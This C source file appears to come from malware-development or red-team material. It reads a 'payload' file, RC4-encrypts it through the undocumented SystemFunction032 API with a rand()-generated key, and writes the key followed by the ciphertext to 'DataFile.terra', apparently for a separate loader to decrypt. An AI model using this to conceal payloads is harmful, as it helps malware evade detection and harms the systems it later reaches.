#include <Windows.h>
#include <time.h>
#include <stdio.h>

#define FILENAME		"DataFile.terra"
#define KEY_SIZE		0x10


BOOL ReportError(const char* ApiName) {
	printf("[!] \"%s\" [ FAILED ] \t%d \n", ApiName, GetLastError());
	return FALSE;
}

BOOL ReadPayloadFile(const char* FileInput, PDWORD sPayloadSize, unsigned char** pPayloadData) {

	printf("[i] Reading \"%s\" ... ", FileInput);

	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD FileSize = NULL;
	DWORD lpNumberOfBytesRead = NULL;

	hFile = CreateFileA(FileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return ReportError("CreateFileA");
	}

	FileSize = GetFileSize(hFile, NULL);

	unsigned char* Payload = (unsigned char*)malloc(FileSize);

	ZeroMemory(Payload, FileSize);

	if (!ReadFile(hFile, Payload, FileSize, &lpNumberOfBytesRead, NULL)) {
		return ReportError("ReadFile");
	}

	printf("\t\t\t[+] DONE \n");


	*pPayloadData = Payload;
	*sPayloadSize = lpNumberOfBytesRead;

	CloseHandle(hFile);

	if (*pPayloadData == NULL || *sPayloadSize == NULL)
		return FALSE;

	return TRUE;
}



VOID GenerateBytes(unsigned char* pBuff, DWORD dwBuffSize ) {

	for (size_t i = 0; i < dwBuffSize; i++)
		pBuff[i] = rand() % 256;

}


typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
);


BOOL Rc4Encrypt(PVOID pPayloadData, SIZE_T sPayloadSize, PBYTE pRc4Key, DWORD dwRc4KeySize) {
	
	printf("[i] Encrypting Data On 0x%p of size %ld ... ", pPayloadData, sPayloadSize);


	NTSTATUS	STATUS	= NULL;
	USTRING		Key		= { .Buffer = pRc4Key,			.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
				Img		= { .Buffer = pPayloadData ,	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}


	printf("\t\t\t[+] DONE \n");
	return TRUE;
}




BOOL WritePayloadFile(const char* FileInput, DWORD sPayloadSize, unsigned char* pPayloadData) {

	printf("[i] Writing \"%s\" ... ", FileInput);

	HANDLE	hFile						= INVALID_HANDLE_VALUE;
	DWORD	lpNumberOfBytesWritten		= NULL;

	hFile = CreateFileA(FileInput, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return ReportError("CreateFileA");


	if (!WriteFile(hFile, pPayloadData, sPayloadSize, &lpNumberOfBytesWritten, NULL) || sPayloadSize != lpNumberOfBytesWritten)
		return ReportError("WriteFile");

	CloseHandle(hFile);

	printf("\t\t\t\t\t\t[+] DONE \n");
	return TRUE;
}





int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("[!] Please Enter Your Payload File Name \n");
		return 0;
	}

	// seed for the key generation part
	srand(time(NULL));

	DWORD	sPayloadSize	= NULL;
	PVOID	pPayloadData	= NULL;
	BYTE	pRc4Key[KEY_SIZE];

	// reading input file
	if (!ReadPayloadFile(argv[1], &sPayloadSize, &pPayloadData)) {
		return 0;
	}


	// generate the key bytes
	GenerateBytes(pRc4Key, KEY_SIZE);
	
	// printing bytes to console
	printf("[i] The Generate Key Bytes: [ ");
	for (size_t i = 0; i < KEY_SIZE; i++)
		printf("%02X ", pRc4Key[i]);
	printf("]\n");

	// do the rc4 encryption
	if (!Rc4Encrypt(pPayloadData, sPayloadSize, pRc4Key, KEY_SIZE)) {
		return 0;
	}

	// making the new buffer
	SIZE_T	sNewPayloadSize = (SIZE_T)(sPayloadSize + KEY_SIZE);
	PVOID	pNewPayloadData = malloc(sNewPayloadSize);
	ZeroMemory(pNewPayloadData, sNewPayloadSize);

	if (pNewPayloadData){
		memcpy(pNewPayloadData, pRc4Key, KEY_SIZE);													// copying key buffer
		memcpy((PVOID)((ULONG_PTR)pNewPayloadData + KEY_SIZE), pPayloadData, sPayloadSize);			// copying the encrypted data next to the key
	}


	// writing the new buffer to DataFile.terra 
	if (!WritePayloadFile(FILENAME, sNewPayloadSize, pNewPayloadData)) {							// writing the key + the encrypted payload to FILENAME
		return 0;
	}

	// some info
	CHAR CurrentDir[MAX_PATH * 2];
	GetCurrentDirectoryA(MAX_PATH * 2, CurrentDir);

	printf("[+] File %s Successfully Wrote Under : %s \n", FILENAME, CurrentDir);
	
	return 0;

}

